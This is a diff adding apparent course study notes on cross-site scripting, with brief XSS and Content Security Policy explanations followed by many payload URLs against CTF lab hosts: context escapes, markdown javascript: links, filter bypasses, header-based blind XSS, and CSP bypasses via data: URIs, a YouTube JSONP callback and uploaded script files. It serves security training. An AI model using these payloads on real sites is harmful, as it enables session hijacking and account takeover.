@@ -1,0 +1,387 @@
+
+--- XSS ---
+
+• Introduction
+• Basic XSS
+• Different Approaches
+• Different Contexts
+• Content Types
+• Markdown
+• Stored XSS
+• Blind XSS
+• Filter Bypasses
+• CSP Explained
+• CSP URI Scheme Bypass
+• CSP JSONP Bypass
+• CSP Upload Bypass
+
+
+-- Introduction --
+
+Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to 
+bypass the same origin policy, which is designed to segregate different websites from each other. 
+Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. 
+If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data.
+Cross-site scripting (XSS) works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can 
+fully compromise their interaction with the application.  
+
+
+-- Basic XSS --
+
+➜ Basic
+
+test999
+0u132isu.eu1.ctfio.com/basic/?name=test999> Developer Tools Check
+
+0u132isu.eu1.ctfio.com/basic/?name="><u>test999
+0u132isu.eu1.ctfio.com/basic/?name="><u>test999<script>alert()</script>
+0u132isu.eu1.ctfio.com/basic/?name="><u>test999<script>alert(1)</script>
+0u132isu.eu1.ctfio.com/basic/?name="><u>test999<script>alert('XSS')</script>
+
+0u132isu.eu1.ctfio.com/basic/?name="><u>test999"><img src=x onerror=alert(1);> [Java Script]
+0u132isu.eu1.ctfio.com/basic/?name="><u>test999"><img src=x onerror=alert('XSS');>
+0u132isu.eu1.ctfio.com/basic/?name="><u>test999"><img src=x onmouseover=alert(1)>
+0u132isu.eu1.ctfio.com/basic/?name="><u>test999"><img src=x onmouseover=document.write(1)>
+
+➜ POST vs. GET
+
+bugbounty123
+
+0u132isu.eu1.ctfio.com/post/ > Developer Tools Check
+
+⇒ Proxys Caido or Burp
+
+name=test999
+name=""><u>test999
+name=test999&param=test999&param2=test999&param3=test999
+
+
+-- Different Approaches --
+
+66ep5hap.eu2.ctfio.com/basic/?name=test123
+66ep5hap.eu2.ctfio.com/basic/?name=</p><h1><u>test123
+66ep5hap.eu2.ctfio.com/basic/?name=</p><h1><u onmouseover=alert(1)>test123
+66ep5hap.eu2.ctfio.com/basic/?name=test123&test1=1111&lastname=&ref=test
+
+66ep5hap.eu2.ctfio.com/basic/?name=<script>alert()</script>
+66ep5hap.eu2.ctfio.com/basic/?name=<script>alert(1)</script>
+
+66ep5hap.eu2.ctfio.com/basic/?name=<script>alert(1);//</script>
+66ep5hap.eu2.ctfio.com/basic/?name=<script>confirm(1);//</script>
+
+66ep5hap.eu2.ctfio.com/basic/?name=<img src=xxxx onmouseover=alert(1)>
+66ep5hap.eu2.ctfio.com/basic/?name=<img src=xxxx onerror=alert(1)>
+
+66ep5hap.eu2.ctfio.com/basic/?name=javascript:alert(1)
+66ep5hap.eu2.ctfio.com/basic/?name=<a href=javascript:alert(1)>test123
+66ep5hap.eu2.ctfio.com/basic/?name=<iframe src=javascript:alert(1)>
+
+66ep5hap.eu2.ctfio.com/basic/?name=<object data="data:text/html,<script>alert(1)</script>"></object>
+66ep5hap.eu2.ctfio.com/basic/?name=<object data="data:text/html,<h1>test123"></object>
+66ep5hap.eu2.ctfio.com/basic/?name=<object data="data:text/javascript,<h1>test123"></object>
+66ep5hap.eu2.ctfio.com/basic/?name=<script src=data:text/javascript,alert(1337)></script>
+
+
+-- Different Contexts --
+
+Escaping Context
+
+// > Starts a comment meaning everything after it is ignored by the browser 
+
+
+-- Input --
+
+udemy123
+0u132isu.eu1.ctfio.com/context-input/?name=udemy123
+0u132isu.eu1.ctfio.com/context-input/?name=udemy123">
+0u132isu.eu1.ctfio.com/context-input/?name=udemy123"><script>alert(1)</script>
+0u132isu.eu1.ctfio.com/context-input/?name=udemy123" onmouseover=alert(1);//
+
+
+-- Textarea --
+
+test123
+0u132isu.eu1.ctfio.com/context-textarea/?name=test123
+0u132isu.eu1.ctfio.com/context-textarea/?name=test123<img/src=x onerror=alert(2)></textarea><img/src=x onerror=alert(3)>
+
+
+-- Title --
+
+0u132isu.eu1.ctfio.com/context-title/?name=test123<img/src=x onerror=alert(2)>
+0u132isu.eu1.ctfio.com/context-title/?name=test123</title><img/src=x onerror=alert(2)>
+
+
+-- Style --
+
+Background Color: #FFFFFF
+https://0b0luzepe4n1.ctfhub.io/context-style/
+https://0b0luzepe4n1.ctfhub.io/context-style/?color=%23FFFFFFtest123
+https://0b0luzepe4n1.ctfhub.io/context-style/?color=%23FFFFFFtest123">
+
+https://0b0luzepe4n1.ctfhub.io/context-style/?color=%23FFFFFFtest123</style><script>alert(1)</script>
+
+
+-- JavaScript Variables --
+
+udemy123
+0u132isu.eu1.ctfio.com/context-js-variable/?name=udemy123
+
+<p class="text-center">
+  "Thanks for entering your name "
+  <span id="name">udemy123</span>
+</p>
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+
+<script> var name = 'udemy123'; $('span#name').html(name); </script>
+
+0u132isu.eu1.ctfio.com/context-js-variable/?name=udemy123<img>
+0u132isu.eu1.ctfio.com/context-js-variable/?name=udemy123</script>
+0u132isu.eu1.ctfio.com/context-js-variable/?name=udemy123' # Ends with a '
+0u132isu.eu1.ctfio.com/context-js-variable/?name=udemy123';
+0u132isu.eu1.ctfio.com/context-js-variable/?name=udemy123';//
+0u132isu.eu1.ctfio.com/context-js-variable/?name=udemy123';alert(1)//
+
+
+-- Content Types --
+
+test1234
+test123</script></textarea>"onmouseover=alert();//
+
+⇒ Proxy
+
+Content-Type: text/html; charset=UTF-8
+GET /content-type/check.php?username=test123%27 HTTP/1.1
+
+https://0u132isu.eu1.ctfio.com/content-type/check.php?username=test123
+https://0u132isu.eu1.ctfio.com/content-type/check.php?username=<u>test123
+https://0u132isu.eu1.ctfio.com/content-type/check.php?username=<u>test123"><img src=x onerror=alert();//>
+https://0u132isu.eu1.ctfio.com/content-type/check.php?username=<u>test123"><a href=javascript:alert()>test123
+
+
+-- Markdown --
+
+Check the DevTools
+
+➜ Basic XSS
+
+**asterisks** or __underscores__
+
+https://lytvd3hd.eu2.cftio.com/markdown/?name=['m an inline-style link](https://www.google.com)
+https://lytvd3hd.eu2.cftio.com/markdown/?name=['m an inline-style link](javascript://alert())
+https://lytvd3hd.eu2.cftio.com/markdown/?name=['m an inline-style link](javascript://alert``)
+https://lytvd3hd.eu2.cftio.com/markdown/?name=['m an inline-style link](javascript:alert'' )
+
+➜ Javascript String Filter
+
+[Test123](javascript:alert`1`)
+[XSS](Javascript:alert(1))
+
+[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+
+[a](JaVaScRiPt:alert(1))
+[thisisalink](https://www.hackinghub.com)
+
+[thisisalink](https://www.hackinghub.com"onerror=alert`)
+[thisisalink](https://www.hackinghub.com"onmouseover=alert`)
+[thisisalink](https://www.hackinghub.com"onclick=alert`)
+
+![thisisatext](https://assets-global.website-files.com/64b6b7da236708cf047fb211/64ceab8155a76af5ce3186dc_HH-Logo-Inverted-Color-p-500.png)
+![thisisatext](https://assets-global.website-files.com/64b6b7da236708cf047fb211/64ceab8155a76af5ce3186dc_HH-Logo-Inverted-Color-p-500.png"onerror=alert``)
+![thisisatext](https://assets-global.website-files.com/64b6b7da236708cf047fb211/64ceab8155a76af5ce3186dc_HH-Logo-Inverted-Color-p-500.png"onerror=alert();//)
+![thisisatext](https://assets-global.website-files.com/64b6b7da236708cf047fb211/64ceab8155a76af5ce3186dc_HH-Logo-Inverted-Color-p-500.png"onerror=alert(1)//)
+
+
+-- Stored XSS --
+
+Stored cross-site scripting (also known as second-order or persistent XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.
+
+"/><u>test123
+<script>alert(1)</script>
+
+
+-- Blind XSS --
+
+<script>alert()</script>
+</textarea></script>"/><script>alert()</script>
+
+<textarea name="bio" class="form-control">&lt;script&gt;alert()&lt;/script&gt;</textarea>
+
+➜ Blind XSS From Headers
+
+</textarea></script>"/><script>alert()</script> + Fake Creditcard Number
+
+jytd3hd.eu2.ctfio.com/headers/admin/login.php
+
+Username: admin
+Password: admin
+
+Proxies (Caido)
+
+Search term:
+Mozilla/5.0
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
+
+Replace term:
+Mozilla/5.0 <script>alert()</script>(Macintosh; Intel Mac OS X 10_15_7)
+
+
+-- Filter Bypasses --
+
+➜ Script Tags case sensitivity
+
+<u>test123
+66ep5hap.eu2.ctfio.com/filter-script-case/?comment=<script>alert(1)</script>
+66ep5hap.eu2.ctfio.com/filter-script-case/?comment=test123<script>alert(1)</script>
+66ep5hap.eu2.ctfio.com/filter-script-case/?comment=script<script>alert(1)</script>
+https://66ep5hap.eu2.ctfio.com/filter-script-case/?comment=script<ScRipT>alert(1)</script>
+https://66ep5hap.eu2.ctfio.com/filter-script-case/?comment=script<ImG src=x onerror=alert()>
+
+➜ Script Tags second occurrence --
+
+<u>test123<script>alert()</script>
+66ep5hap.eu2.ctfio.com/filter-script-2nd/?comment=<u>test123<script>confirm()</script>
+66ep5hap.eu2.ctfio.com/filter-script-2nd/?comment= u>test123<script>test123</script>
+66ep5hap.eu2.ctfio.com/filter-script-2nd/?comment=<u>test123<ScRipT>test123</script>
+66ep5hap.eu2.ctfio.com/filter-script-2nd/?comment=<u>test123<ScRipT>alert(1)</script>
+66ep5hap.eu2.ctfio.com/filter-script-2nd/?comment=<u>test123<ScRipT>alert(1)</script><ScRipT>alert(1)</script>
+
+➜ Script Tags
+
+<script>alert()</script><script>alert()</script>
+<SCRipT>alert()</script><script>alert()</script>
+
+<u>test123
+<u/onmouseover=alert()>//>test123
+<u/onmouseover=alert();//>test123
+
+➜ Tag On Attributes
+
+<u/onmouseover=alert();//>test123
+<img/src=x onerror=alert();//
+
+<script>alert()</script>
+<iframe/src=javascript:alert();//> <a/href=javascript:alert(2)>click_me
+<a/href=javascript:alert(2)>click_me
+
+<img src=x onerror=alert();//
+
+➜ All Tags
+
+<script>alert()</script>
+<img src=x onerror=alert();>
+<img src=x onerror=alert();
+
+<scr<script>ipt>alert()</sc</script>ript>
+<script/src=x>
+<script onerror=alert();//>
+
+
+-- CSP Explained --
+
+➜ What is CSP
+
+• Content Security Policy (CSP)
+• Enabled by including the "Content-Security-Policy" header
+• <meta> element in the DOM
+
+➜ CSP Example
+
+<meta
+  http-equiv="Content-Security-Policy"
+  content="default-src 'self'; img-src https://www.site.com;" />
+
+Content-Security-Policy: default-src 'self'; img-src site.com;
+
+➜ CSP Example (Directives)
+
+• default-src: Specifies the default policy for loading content, used if no other directives apply.
+• script-src: Specifies valid sources for JavaScript.
+• child-src: Specifies valid sources for creation of nested browsing contexts by iframe, frame, embed, or object elements.
+• frame-src: Specifies valid sources for loading frames.
+• frame-ancestors: Specifies valid sources for loading embedded content in a frame or iframe.
+• img-src: Specifies valid sources for images.
+• object-src: Specifies valid sources for loading embedded objects.
+• base-uri: Specifies valid sources for setting the base URL for document URLs.
+• report-uri: Specifies a URL to which the browser should send violation reports when a policy is broken.
+• sandbox: Specifies restrictions for the resource being applied.
+
+➜ Values
+
+• 'none': Prevents loading content from any source.
+• 'self': Allows loading content from the same origin (excluding subdomains).
+• 'unsafe-inline': Allows the use of inline scripts and styles.
+• 'unsafe-eval': Allows the use of eval() functions.
+• <scheme>: Allows loading content over a specific scheme (e.g., https:).
+• <host-source>: Allows loading content from a specific host or domain.
+• data:: Allows the use of inline data such as base64-encoded images.
+• blob:: Allows the use of Blob URLs.
+
+➜ CSP Example
+
+default-src 'self' : This specifies that resources such as scripts, stylesheets, fonts, etc. can only be loaded from the same origin as the page itself.
+
+img-src https://www.site.com : This specifies that images can be loaded from any subdomain of a website as long as it is served over HTTPS.
+
+
+-- CSP URI Scheme Bypass --
+
+Content-Security-Policy: script-src 'self' https://app.hackinghub.io data:
+
+data: > data tag
+
+<object data="data:text/html,<script>alert(1)</script>"></object>
+<script src="data:;base64, YWxlcnQoMSk="></script>
+<script src="data:text/javascript,alert(document.domain)"></script>
+<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
+
+
+-- CSP JSONP Bypass --
+
+https://www.youtube.com/oembed?callback=
+https://www.youtube.com/oembed?url=
+
+https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v=Z_Kk1zf16l4
+https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v=Z_Kk1zf16l4&callback=test()
+https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v=Z_Kk1zf16l4&callback=alert(1)
+
+<script src="https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v=Z_Kk1zf16l4&callback=alert(1)"></script>
+
+
+-- CSP Upload Bypass --
+
+Username: adam
+Password: password
+
+<script>alert(document.domain)</script>
+<script/src=https://nahamsec.com/1.js></script>
+
+<script/src=https://uazfyzwu.eu1.ctfio.com/123.js>
+https://44c70n2gf0f1.ctfhub.io/csp-upload/123.js
+
+https://uazfyzwu.eu1.ctfio.com/csp-upload/uploads/dbf50a45490542b50b29cdb2753a871b.js
+
+filename="avatar.jpeg.js"
+
+alert(1);//
+document.cookie();//
+
+<script/src=https://uazfyzwu.eu1.ctfio.com/csp-upload/uploads/2ec8d9239f2ad9162fd6543ac3a8aa2e.js></script>
+
+
+
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#identify-an-xss-endpoint
+
+https://github.com/cujanovic/Markdown-XSS-Payloads
+https://github.com/adam-p/markdown-here/wiki/markdown-cheatsheet
+
+https://github.com/mandatoryprogrammer/xsshunter 
+https://xsshunter.trufflesecurity.com/app/#/xsspayloads 
+
+https://www.cobalt.io/blog/csp-and-bypasses 
+https://www.vaadata.com/blog/content-security-policy-bypass-techniques-and-security-best-practices/
+https://outpost24.com/blog/content-security-policy-guide/ 
+
+*
